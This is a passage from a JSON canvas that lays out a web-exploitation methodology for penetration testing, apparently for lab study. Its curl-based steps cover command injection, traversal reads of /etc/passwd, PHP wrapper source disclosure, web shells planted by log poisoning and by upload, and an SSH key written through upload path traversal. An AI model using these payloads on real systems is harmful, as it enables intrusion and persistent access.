      "y": 23771,
      "width": 4080,
      "height": 1352,
      "label": "Cross role, function or session authorization boundaries",
      "color": "4"
    },
    {
      "id": "method-group:web-mass-assignment",
      "type": "group",
      "x": 4715,
      "y": 25248,
      "width": 4080,
      "height": 1400,
      "label": "Modify a protected property through excessive writable fields",
      "color": "4"
    },
    {
      "id": "method-group:web-xss",
      "type": "group",
      "x": 4715,
      "y": 26773,
      "width": 4080,
      "height": 1376,
      "label": "Execute browser code and validate a useful same-origin action",
      "color": "4"
    },
    {
      "id": "method-group:web-cms",
      "type": "group",
      "x": 4715,
      "y": 28274,
      "width": 4080,
      "height": 1400,
      "label": "Use WordPress component evidence and authorized administration features",
      "color": "4"
    },
    {
      "id": "method-group:web-ssrf",
      "type": "group",
      "x": 4715,
      "y": 29799,
      "width": 4080,
      "height": 1328,
      "label": "Use server-side requests to inspect reachable internal behavior",
      "color": "4"
    },
    {
      "id": "method-group:web-ssti",
      "type": "group",
      "x": 4715,
      "y": 31252,
      "width": 4080,
      "height": 1520,
      "label": "Prove server-side template evaluation and identify its engine",
      "color": "4"
    },
    {
      "id": "method-group:web-xxe",
      "type": "group",
      "x": 4715,
      "y": 32897,
      "width": 4080,
      "height": 1424,
      "label": "Use an XML parser's external-entity behavior for bounded file read",
      "color": "4"
    },
    {
      "id": "method-group:web-nosql",
      "type": "group",
      "x": 4715,
      "y": 34446,
      "width": 4080,
      "height": 1520,
      "label": "Test structured NoSQL operator injection with identity controls",
      "color": "4"
    },
    {
      "id": "method-group:web-php-deserialization",
      "type": "group",
      "x": 4715,
      "y": 36091,
      "width": 4080,
      "height": 1424,
      "label": "Match PHP deserialization gadgets to installed dependencies",
      "color": "4"
    },
    {
      "id": "method-group:web-yaml",
      "type": "group",
      "x": 4715,
      "y": 37640,
      "width": 4080,
      "height": 1304,
      "label": "Validate unsafe YAML object construction",
      "color": "4"
    },
    {
      "id": "method-group:web-shellshock",
      "type": "group",
      "x": 4715,
      "y": 39069,
      "width": 4080,
      "height": 1352,
      "label": "Test Shellshock only through a confirmed CGI-to-Bash chain",
      "color": "4"
    },
    {
      "id": "method-group:sql-oob",
      "type": "group",
      "x": 4715,
      "y": 40546,
      "width": 4080,
      "height": 1328,
      "label": "Conditional: validate an out-of-band SQL request channel",
      "color": "4"
    },
    {
      "id": "topic:web-exploitation",
      "type": "text",
      "x": 4740,
      "y": 440,
      "width": 1800,
      "height": 140,
      "text": "# Turn application weaknesses into access\n\nStart from a valid request produced by web mapping. Preserve account, cookies, method and normal input before changing one property.",
      "color": "4"
    },
    {
      "id": "flow:web-exploitation:home",
      "type": "text",
      "x": 4740,
      "y": 620,
      "width": 350,
      "height": 240,
      "text": "## Investigation flow\n\nTurn application weaknesses into access\n\n · \n\nBranches describe evidence and missing conditions. Follow one useful lead, then return to unfinished coverage.",
      "color": "6"
    },
    {
      "id": "flow:web-exploitation:check-0",
      "type": "text",
      "x": 5240,
      "y": 620,
      "width": 760,
      "height": 324,
      "text": "## Test the primitive exposed by the real request\n\nUse this command branch only when an input reaches a utility/command context. Match the observed OS/parser.\n\n```bash\ncurl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH\ncurl -skG --data-urlencode 'host=127.0.0.1&whoami' http://TARGET:PORT/PATH\n```\n\n**Prove visible or blind operating-system command injection — on this canvas**"
    },
    {
      "id": "flow:web-exploitation:check-0-finding-0",
      "type": "text",
      "x": 6290,
      "y": 620,
      "width": 610,
      "height": 204,
      "text": "### Target UID/name appears only in the test response\n\nVerify the destination and process identity; then choose a viable session route.\n\n[[tracks/06 Shells and Transfers.canvas|Verify command execution, host and represented identity → 06 Shells and Transfers]]",
      "color": "4"
    },
    {
      "id": "flow:web-exploitation:check-0-finding-1",
      "type": "text",
      "x": 6290,
      "y": 869,
      "width": 610,
      "height": 180,
      "text": "### Only a repeatable controlled delay is visible\n\nUse the blind verification variants; one slow request proves nothing.\n\n**Prove visible or blind operating-system command injection — on this canvas**",
      "color": "4"
    },
    {
      "id": "flow:web-exploitation:check-0-fallback",
      "type": "text",
      "x": 7060,
      "y": 620,
      "width": 610,
      "height": 180,
      "text": "### Unresolved / alternate check\n\nInput is only reflected: investigate another mapped input or mechanism.\n\n**Map parameters, API methods, objects and writable properties — on this canvas**",
      "color": "2"
    },
    {
      "id": "flow:web-exploitation:check-1",
      "type": "text",
      "x": 5240,
      "y": 1274,
      "width": 760,
      "height": 300,
      "text": "## For file inputs, prove actual file read\n\nKeep session and request method intact; choose a target file appropriate to the observed platform.\n\n```bash\ncurl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH\n```\n\n**Read files through directory traversal — on this canvas**"
    },
    {
      "id": "flow:web-exploitation:check-1-finding-0",
      "type": "text",
      "x": 6290,
      "y": 1274,
      "width": 610,
      "height": 204,
      "text": "### Recognizable file contents\n\nRetrieve relevant application config/source; classify any recovered material.\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
      "color": "4"
    },
    {
      "id": "flow:web-exploitation:check-1-finding-1",
      "type": "text",
      "x": 6290,
      "y": 1523,
      "width": 610,
      "height": 180,
      "text": "### A PHP include sink accepts a filter wrapper\n\nTest source disclosure separately from file execution.\n\n**Disclose PHP source through an inclusion wrapper — on this canvas**",
      "color": "4"
    },
    {
      "id": "flow:web-exploitation:check-1-fallback",
      "type": "text",
      "x": 7060,
      "y": 1274,
      "width": 610,
      "height": 204,
      "text": "### Unresolved / alternate check\n\nOnly an error/template/status changed: return to request mapping; do not claim a file read.\n\n**Map parameters, API methods, objects and writable properties — on this canvas**",
      "color": "2"
    },
    {
      "id": "flow:web-exploitation:check-2",
      "type": "text",
      "x": 5240,
      "y": 1928,
      "width": 760,
      "height": 300,
      "text": "## For uploads, locate the stored file and its handler\n\nAcceptance, storage, retrieval and server-side execution are separate tests.\n\n```bash\nprintf '%s\\n' 'UPLOAD_CANARY' > probe.txt\ncurl -sk -b cookies.txt -F 'file=@probe.txt;type=text/plain' http://TARGET:PORT/upload\n```\n\n**Establish upload acceptance, storage and retrieval — on this canvas**"
    },
    {
      "id": "flow:web-exploitation:check-2-finding-0",
      "type": "text",
      "x": 6290,
      "y": 1928,
      "width": 610,
      "height": 204,
      "text": "### A controlled file is stored and retrieved\n\nCheck extension, interpreter and executable handler before choosing an execution payload.\n\n**Execute an uploaded file through a compatible handler — on this canvas**",
      "color": "4"
    },
    {
      "id": "flow:web-exploitation:check-2-finding-1",
      "type": "text",
      "x": 6290,
      "y": 2177,
      "width": 610,
      "height": 180,
      "text": "### The upload destination path is controllable\n\nIdentify the consumer that will use that exact location.\n\n**Use upload path control to reach a useful consumer — on this canvas**",
      "color": "4"
    },
    {
      "id": "flow:web-exploitation:check-2-fallback",
      "type": "text",
      "x": 7060,
      "y": 1928,
      "width": 610,
      "height": 204,
      "text": "### Unresolved / alternate check\n\nNo compatible handler/consumer: treat it as storage and investigate another application boundary.\n\n**Cross role, function or session authorization boundaries — on this canvas**",
      "color": "2"
    },
    {
      "id": "notes:web-exploitation",
      "type": "file",
      "file": "notes/web-exploitation.md",
      "x": 4740,
      "y": 2587,
      "width": 2100,
      "height": 850
    },
    {
      "id": "notes-label:web-exploitation",
      "type": "text",
      "x": 7030,
      "y": 2587,
      "width": 1400,
      "height": 180,
      "text": "## Full procedures and alternatives\n\nThe adjacent embedded note is readable here. Scroll inside it for complete variants. Commands and decisions continue below.",
      "color": "6"
    },
    {
      "id": "method:web-traversal:start",
      "type": "text",
      "x": 4750,
      "y": 3862,
      "width": 350,
      "height": 250,
      "text": "## Read files through directory traversal\n\nA download/path parameter or URL segment influences a local filename",
      "color": "5"
    },
    {
      "id": "method:web-traversal:discover",
      "type": "text",
      "x": 5250,
      "y": 3822,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -sk -b cookies.txt -D - 'http://TARGET:PORT/download?file=report.pdf'\n```"
    },
    {
      "id": "method:web-traversal:interpret",
      "type": "text",
      "x": 6180,
      "y": 3802,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nAn application-controlled file selection is the cue to test path confinement; it is not yet arbitrary read.",
      "color": "6"
    },
    {
      "id": "method:web-traversal:validate",
      "type": "text",
      "x": 6180,
      "y": 4048,
      "width": 580,
      "height": 180,
      "text": "### Missing prerequisite\n\nRequest a known target-platform file through the real file parameter/path and compare with the normal response. Require recognizable file contents; a reflected filename, error or status change is not a read.",
      "color": "2"
    },
    {
      "id": "method:web-traversal:checks",
      "type": "text",
      "x": 5250,
      "y": 4062,
      "width": 780,
      "height": 132,
      "text": "### Validate the condition\n\n```bash\ncurl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH\n```"
    },
    {
      "id": "method:web-traversal:enabled",
      "type": "text",
      "x": 6960,
      "y": 3752,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nA controlled out-of-directory request returns the intended target bytes: the traversal method is available.\n\n**Verify:** Require recognizable target-file content and controls that exclude a reflected input or static error page.\n\n[[notes/web-exploitation.md#web-traversal|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-traversal:ruledout",
      "type": "text",
      "x": 6960,
      "y": 4093,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nAn allowlist rejects paths and only serves approved report IDs: this path-selection context is not a traversal route.",
      "color": "1"
    },
    {
      "id": "method:web-traversal:unknown",
      "type": "text",
      "x": 6960,
      "y": 4314,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nAn error mentioning a path shows influence but not read access; compare normal/control requests and permission/path depth.",
      "color": "2"
    },
    {
      "id": "method:web-traversal:action",
      "type": "text",
      "x": 7810,
      "y": 3752,
      "width": 900,
      "height": 228,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\ncurl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH\n```\n\n[[notes/web-exploitation.md#web-traversal|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-traversal:next-0",
      "type": "text",
      "x": 7810,
      "y": 4070,
      "width": 620,
      "height": 276,
      "text": "### Classify the artifact and its identity context\n\n**When:** A secret-like value, key file, stored hash, challenge response or ticket\n\n**Still required:** Artifact provenance and format; possible local/domain/application identity and compatible protocol\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
      "color": "5"
    },
    {
      "id": "method:web-traversal:next-1",
      "type": "text",
      "x": 7810,
      "y": 4401,
      "width": 620,
      "height": 276,
      "text": "### Disclose PHP source through an inclusion wrapper\n\n**When:** A PHP page/include parameter and possible access to local application files\n\n**Still required:** A PHP inclusion sink accepts the filter wrapper and the process can read the source\n\n**Disclose PHP source through an inclusion wrapper — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-traversal:next-2",
      "type": "text",
      "x": 7810,
      "y": 4732,
      "width": 620,
      "height": 276,
      "text": "### Inspect source, backups, configuration and repository artifacts\n\n**When:** JavaScript endpoints, backup names, exposed configuration or Git metadata\n\n**Still required:** Readable application artifact or a complete recoverable repository; preserve the public-source scope\n\n**Inspect source, backups, configuration and repository artifacts — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-php-source:start",
      "type": "text",
      "x": 4750,
      "y": 5363,
      "width": 350,
      "height": 250,
      "text": "## Disclose PHP source through an inclusion wrapper\n\nA PHP page/include parameter and possible access to local application files",
      "color": "5"
    },
    {
      "id": "method:web-php-source:discover",
      "type": "text",
      "x": 5250,
      "y": 5323,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -sk -D - 'http://TARGET:PORT/index.php?page=about'\n```"
    },
    {
      "id": "method:web-php-source:interpret",
      "type": "text",
      "x": 6180,
      "y": 5303,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nAn include-related error suggests an evaluating PHP sink, unlike an ordinary file-download function.",
      "color": "6"
    },
    {
      "id": "method:web-php-source:validate",
      "type": "text",
      "x": 6180,
      "y": 5549,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nVerify that the actual sink accepts a filter wrapper and returns decodable target source; errors alone do not prove it.",
      "color": "2"
    },
    {
      "id": "method:web-php-source:checks",
      "type": "text",
      "x": 5250,
      "y": 5563,
      "width": 780,
      "height": 156,
      "text": "### Validate the condition\n\n```bash\ncurl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php\n```"
    },
    {
      "id": "method:web-php-source:enabled",
      "type": "text",
      "x": 6960,
      "y": 5253,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nThe wrapper yields source that decodes correctly: use that source-disclosure method.\n\n**Verify:** Decode the response and identify real target source; normal HTML rendering does not prove source disclosure.\n\n[[notes/web-exploitation.md#web-php-source|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-php-source:ruledout",
      "type": "text",
      "x": 6960,
      "y": 5594,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe endpoint reads raw bytes through a wrapper-incompatible API: reject this PHP-inclusion hypothesis.",
      "color": "1"
    },
    {
      "id": "method:web-php-source:unknown",
      "type": "text",
      "x": 6960,
      "y": 5815,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nPHP branding without sink evidence leaves inclusion unproved; investigate normal request/source behavior first.",
      "color": "2"
    },
    {
      "id": "method:web-php-source:action",
      "type": "text",
      "x": 7810,
      "y": 5253,
      "width": 900,
      "height": 276,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\ncurl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php\nprintf '%s' 'BASE64_DATA' | base64 -d\n```\n\n[[notes/web-exploitation.md#web-php-source|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-php-source:next-0",
      "type": "text",
      "x": 7810,
      "y": 5619,
      "width": 620,
      "height": 276,
      "text": "### Classify the artifact and its identity context\n\n**When:** A secret-like value, key file, stored hash, challenge response or ticket\n\n**Still required:** Artifact provenance and format; possible local/domain/application identity and compatible protocol\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
      "color": "5"
    },
    {
      "id": "method:web-php-source:next-1",
      "type": "text",
      "x": 7810,
      "y": 5950,
      "width": 620,
      "height": 276,
      "text": "### Turn controlled local file content into inclusion execution\n\n**When:** A confirmed evaluating include and a log or file containing attacker-controlled bytes\n\n**Still required:** Controlled content survives logging; inclusion identity can read it; interpreter evaluates it; requested command facility is available\n\n**Turn controlled local file content into inclusion execution — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-php-source:next-2",
      "type": "text",
      "x": 7810,
      "y": 6281,
      "width": 620,
      "height": 276,
      "text": "### Prove visible or blind operating-system command injection\n\n**When:** An input appears in a command-like operation or causes shell-dependent behavior\n\n**Still required:** Input reaches command execution with an exploitable parsing boundary; process identity/runtime can perform the selected proof\n\n**Prove visible or blind operating-system command injection — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-lfi-log:start",
      "type": "text",
      "x": 4750,
      "y": 6912,
      "width": 350,
      "height": 250,
      "text": "## Turn controlled local file content into inclusion execution\n\nA confirmed evaluating include and a log or file containing attacker-controlled bytes",
      "color": "5"
    },
    {
      "id": "method:web-lfi-log:discover",
      "type": "text",
      "x": 5250,
      "y": 6872,
      "width": 780,
      "height": 204,
      "text": "### Discover\n\n```text\ncurl -sk -A 'LOG_CANARY' http://TARGET:PORT/\ncurl -skG --data-urlencode 'page=/PATH/TO/access.log' http://TARGET:PORT/index.php\n```"
    },
    {
      "id": "method:web-lfi-log:interpret",
      "type": "text",
      "x": 6180,
      "y": 6852,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nThe include/read identity can reach a log containing your controlled input; evaluation and payload preservation still need proof.",
      "color": "6"
    },
    {
      "id": "method:web-lfi-log:validate",
      "type": "text",
      "x": 6180,
      "y": 7098,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nSeparate raw file read from interpreter evaluation, confirm exact file path and encoding, then a minimal command effect.",
      "color": "2"
    },
    {
      "id": "method:web-lfi-log:checks",
      "type": "text",
      "x": 5250,
      "y": 7136,
      "width": 780,
      "height": 132,
      "text": "### Validate the condition\n\n```bash\ncurl -skG --data-urlencode 'page=/var/log/apache2/access.log' http://TARGET:PORT/index.php\n```"
    },
    {
      "id": "method:web-lfi-log:enabled",
      "type": "text",
      "x": 6960,
      "y": 6802,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nControlled log bytes are evaluated and the bounded identity proof succeeds: use the inclusion-execution chain.\n\n**Verify:** Require command-specific output distinct from the logged payload and record hostname/identity.\n\n[[notes/web-exploitation.md#web-lfi-log|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-lfi-log:ruledout",
      "type": "text",
      "x": 6960,
      "y": 7143,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe log is only served as inert text: rule out execution through this reader while retaining file disclosure.",
      "color": "1"
    },
    {
      "id": "method:web-lfi-log:unknown",
      "type": "text",
      "x": 6960,
      "y": 7364,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nNo marker may mean a different log, buffered writes or escaped content; inspect configuration before changing payloads.",
      "color": "2"
    },
    {
      "id": "method:web-lfi-log:action",
      "type": "text",
      "x": 7810,
      "y": 6802,
      "width": 900,
      "height": 276,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\ncurl -sk -A '<?php echo shell_exec($_GET[\"cmd\"]); ?>' http://TARGET:PORT/\ncurl -skG --data-urlencode 'page=/var/log/apache2/access.log' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php\n```\n\n[[notes/web-exploitation.md#web-lfi-log|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-lfi-log:next-0",
      "type": "text",
      "x": 7810,
      "y": 7168,
      "width": 620,
      "height": 252,
      "text": "### Verify command execution, host and represented identity\n\n**When:** A PoC, injected command or remote client reports execution\n\n**Still required:** A functioning execution primitive and an observable output or controlled side effect\n\n[[tracks/06 Shells and Transfers.canvas|Verify command execution, host and represented identity → 06 Shells and Transfers]]",
      "color": "5"
    },
    {
      "id": "method:web-lfi-log:next-1",
      "type": "text",
      "x": 7810,
      "y": 7475,
      "width": 620,
      "height": 252,
      "text": "### Connect a Linux reverse shell through an available interpreter\n\n**When:** Linux command execution exists but an interactive channel is needed\n\n**Still required:** A confirmed Bash/Python/PHP/Netcat implementation, correct parser wrapping, target-to-listener route and compatible listener\n\n[[tracks/06 Shells and Transfers.canvas|Connect a Linux reverse shell through an available interpreter → 06 Shells and Transfers]]",
      "color": "5"
    },
    {
      "id": "method:web-lfi-log:next-2",
      "type": "text",
      "x": 7810,
      "y": 7782,
      "width": 620,
      "height": 276,
      "text": "### Read files through directory traversal\n\n**When:** A download/path parameter or URL segment influences a local filename\n\n**Still required:** Untrusted path reaches a filesystem read outside its intended directory; process identity can read the requested file\n\n**Read files through directory traversal — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-upload:start",
      "type": "text",
      "x": 4750,
      "y": 8413,
      "width": 350,
      "height": 250,
      "text": "## Establish upload acceptance, storage and retrieval\n\nAn upload/import/attachment function",
      "color": "5"
    },
    {
      "id": "method:web-upload:discover",
      "type": "text",
      "x": 5250,
      "y": 8373,
      "width": 780,
      "height": 204,
      "text": "### Discover\n\n```text\nprintf '%s\\n' 'UPLOAD_CANARY' > probe.txt\ncurl -sk -b cookies.txt -F 'file=@probe.txt;type=text/plain' http://TARGET:PORT/upload\n```"
    },
    {
      "id": "method:web-upload:interpret",
      "type": "text",
      "x": 6180,
      "y": 8353,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nThe real upload route, field and response identify a storage/retrieval candidate.",
      "color": "6"
    },
    {
      "id": "method:web-upload:validate",
      "type": "text",
      "x": 6180,
      "y": 8599,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nRetrieve the canary independently; establish stored bytes, final name and account/context before testing execution.",
      "color": "2"
    },
    {
      "id": "method:web-upload:enabled",
      "type": "text",
      "x": 6960,
      "y": 8303,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nThe canary is stored and retrievable: a write/retrieval primitive is verified.\n\n**Verify:** Confirm saved/retrieved bytes and the final identifier/path; a success message alone is insufficient.\n\n[[notes/web-exploitation.md#web-upload|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-upload:ruledout",
      "type": "text",
      "x": 6960,
      "y": 8644,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe server only validates and discards the upload: reject the assumed persistent-write capability.",
      "color": "1"
    },
    {
      "id": "method:web-upload:unknown",
      "type": "text",
      "x": 6960,
      "y": 8865,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nA success message without a retrieval/path observation leaves persistence unknown.",
      "color": "2"
    },
    {
      "id": "method:web-upload:action",
      "type": "text",
      "x": 7810,
      "y": 8303,
      "width": 900,
      "height": 252,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\nprintf '%s\\n' 'UPLOAD_CANARY_7F31' > probe.txt\ncurl -sk -b cookies.txt -F 'file=@probe.txt;filename=probe.txt;type=text/plain' http://TARGET:PORT/upload\n```\n\n[[notes/web-exploitation.md#web-upload|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-upload:next-0",
      "type": "text",
      "x": 7810,
      "y": 8645,
      "width": 620,
      "height": 300,
      "text": "### Execute an uploaded file through a compatible handler\n\n**When:** Uploads are retrievable and the application stack suggests an executable file handler\n\n**Still required:** Controlled executable content survives validation; final storage/URL is handled by the compatible interpreter; process execution is permitted\n\n**Execute an uploaded file through a compatible handler — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-upload:next-1",
      "type": "text",
      "x": 7810,
      "y": 9000,
      "width": 620,
      "height": 276,
      "text": "### Use upload path control to reach a useful consumer\n\n**When:** A multipart filename/import path appears to influence the filesystem destination\n\n**Still required:** Destination path control survives normalization; write identity can reach the destination; a known consumer accepts the resulting file\n\n**Use upload path control to reach a useful consumer — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-upload:next-2",
      "type": "text",
      "x": 7810,
      "y": 9331,
      "width": 620,
      "height": 276,
      "text": "### Map functions, roles and normal requests manually\n\n**When:** Forms, downloads, exports, account functions or role-specific interfaces\n\n**Still required:** A normal request baseline and the relevant account/role; authorized accounts for role comparisons\n\n**Map functions, roles and normal requests manually — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-upload-exec:start",
      "type": "text",
      "x": 4750,
      "y": 9962,
      "width": 350,
      "height": 250,
      "text": "## Execute an uploaded file through a compatible handler\n\nUploads are retrievable and the application stack suggests an executable file handler",
      "color": "5"
    },
    {
      "id": "method:web-upload-exec:discover",
      "type": "text",
      "x": 5250,
      "y": 9922,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -sk -i http://TARGET:PORT/uploads/FILE\n```"
    },
    {
      "id": "method:web-upload-exec:interpret",
      "type": "text",
      "x": 6180,
      "y": 9902,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nA retrievable script may be inert. The interesting detail is how the final location is handled, not acceptance of a script extension.",
      "color": "6"
    },
    {
      "id": "method:web-upload-exec:validate",
      "type": "text",
      "x": 6180,
      "y": 10148,
      "width": 580,
      "height": 180,
      "text": "### Missing prerequisite\n\nRetrieve the exact stored upload and request it through the candidate server-side handler. Verify an attributable identity marker from that request; uploaded bytes or a 200 response alone do not prove execution.",
      "color": "2"
    },
    {
      "id": "method:web-upload-exec:enabled",
      "type": "text",
      "x": 6960,
      "y": 9852,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nThe correct final handler executes the minimal proof as the web identity: choose upload-to-execution.\n\n**Verify:** Require target command output and identity; acceptance, source download and a 200 status are weaker results.\n\n[[notes/web-exploitation.md#web-upload-exec|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-upload-exec:ruledout",
      "type": "text",
      "x": 6960,
      "y": 10193,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe file consistently downloads/displays as source in non-executable storage: rule out execution at this location.",
      "color": "1"
    },
    {
      "id": "method:web-upload-exec:unknown",
      "type": "text",
      "x": 6960,
      "y": 10414,
      "width": 620,
      "height": 132,
      "text": "### Evidence inconclusive\n\nUnknown server rename or storage URL leaves handler selection unresolved.",
      "color": "2"
    },
    {
      "id": "method:web-upload-exec:action",
      "type": "text",
      "x": 7810,
      "y": 9852,
      "width": 900,
      "height": 276,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\nprintf '%s\\n' '<?php if(isset($_GET[\"cmd\"])){echo shell_exec($_GET[\"cmd\"]);} ?>' > check.php\ncurl -sk -b cookies.txt -F 'file=@check.php;filename=check.php;type=application/x-php' http://TARGET:PORT/upload\ncurl -skG --data-urlencode 'cmd=id' http://TARGET:PORT/uploads/check.php\n```\n\n[[notes/web-exploitation.md#web-upload-exec|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-upload-exec:next-0",
      "type": "text",
      "x": 7810,
      "y": 10218,
      "width": 620,
      "height": 252,
      "text": "### Verify command execution, host and represented identity\n\n**When:** A PoC, injected command or remote client reports execution\n\n**Still required:** A functioning execution primitive and an observable output or controlled side effect\n\n[[tracks/06 Shells and Transfers.canvas|Verify command execution, host and represented identity → 06 Shells and Transfers]]",
      "color": "5"
    },
    {
      "id": "method:web-upload-exec:next-1",
      "type": "text",
      "x": 7810,
      "y": 10525,
      "width": 620,
      "height": 252,
      "text": "### Connect a Linux reverse shell through an available interpreter\n\n**When:** Linux command execution exists but an interactive channel is needed\n\n**Still required:** A confirmed Bash/Python/PHP/Netcat implementation, correct parser wrapping, target-to-listener route and compatible listener\n\n[[tracks/06 Shells and Transfers.canvas|Connect a Linux reverse shell through an available interpreter → 06 Shells and Transfers]]",
      "color": "5"
    },
    {
      "id": "method:web-upload-exec:next-2",
      "type": "text",
      "x": 7810,
      "y": 10832,
      "width": 620,
      "height": 276,
      "text": "### Use upload path control to reach a useful consumer\n\n**When:** A multipart filename/import path appears to influence the filesystem destination\n\n**Still required:** Destination path control survives normalization; write identity can reach the destination; a known consumer accepts the resulting file\n\n**Use upload path control to reach a useful consumer — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-upload-path:start",
      "type": "text",
      "x": 4750,
      "y": 11463,
      "width": 350,
      "height": 250,
      "text": "## Use upload path control to reach a useful consumer\n\nA multipart filename/import path appears to influence the filesystem destination",
      "color": "5"
    },
    {
      "id": "method:web-upload-path:discover",
      "type": "text",
      "x": 5250,
      "y": 11423,
      "width": 780,
      "height": 204,
      "text": "### Discover\n\n```text\ncurl -sk -b cookies.txt -F 'file=@probe.txt;filename=../UNIQUE_CANARY.txt;type=text/plain' http://TARGET:PORT/upload\n```"
    },
    {
      "id": "method:web-upload-path:interpret",
      "type": "text",
      "x": 6180,
      "y": 11403,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nAn independently located out-of-directory canary is path-control evidence; it does not establish access to another user's key directory.",
      "color": "6"
    },
    {
      "id": "method:web-upload-path:validate",
      "type": "text",
      "x": 6180,
      "y": 11649,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nConfirm filesystem identity, exact destination semantics, write permissions and a useful consumer/trigger.",
      "color": "2"
    },
    {
      "id": "method:web-upload-path:enabled",
      "type": "text",
      "x": 6960,
      "y": 11353,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nA controlled usable destination and its consumer accept the file: select that verified write-to-access chain.\n\n**Verify:** Independently prove destination and bytes before claiming a privileged consumer or accepted key.\n\n[[notes/web-exploitation.md#web-upload-path|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-upload-path:ruledout",
      "type": "text",
      "x": 6960,
      "y": 11694,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe server strips path components and stores only a generated basename: reject arbitrary placement in that context.",
      "color": "1"
    },
    {
      "id": "method:web-upload-path:unknown",
      "type": "text",
      "x": 6960,
      "y": 11915,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nA reflected submitted path without independent location evidence leaves placement inconclusive.",
      "color": "2"
    },
    {
      "id": "method:web-upload-path:action",
      "type": "text",
      "x": 7810,
      "y": 11353,
      "width": 900,
      "height": 324,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\nssh-keygen -t ed25519 -f ./web_upload_key -N ''\ncp ./web_upload_key.pub ./authorized_keys\ncurl -sk -b cookies.txt -F 'file=@authorized_keys;filename=../../../../home/USER/.ssh/authorized_keys' http://TARGET:PORT/upload\nssh -i ./web_upload_key -p SSH_PORT USER@TARGET\n```\n\n[[notes/web-exploitation.md#web-upload-path|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-upload-path:next-0",
      "type": "text",
      "x": 7810,
      "y": 11767,
      "width": 620,
      "height": 252,
      "text": "### Use SSH passwords, keys and forwarding-capable access\n\n**When:** An SSH service and a known password, private key or agent context\n\n**Still required:** Compatible authentication method, correct user, accepted key policy and the requested shell/subsystem permission\n\n[[tracks/02 Services.canvas|Use SSH passwords, keys and forwarding-capable access → 02 Services]]",
      "color": "5"
    },
    {
      "id": "method:web-upload-path:next-1",
      "type": "text",
      "x": 7810,
      "y": 12074,
      "width": 620,
      "height": 252,
      "text": "### Prove effective file, directory, ACL and mount control\n\n**When:** A root-consumed file or directory appears writable\n\n**Still required:** Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately\n\n[[tracks/07 Linux Privilege Escalation.canvas|Prove effective file, directory, ACL and mount control → 07 Linux Privilege Escalation]]",
      "color": "5"
    },
    {
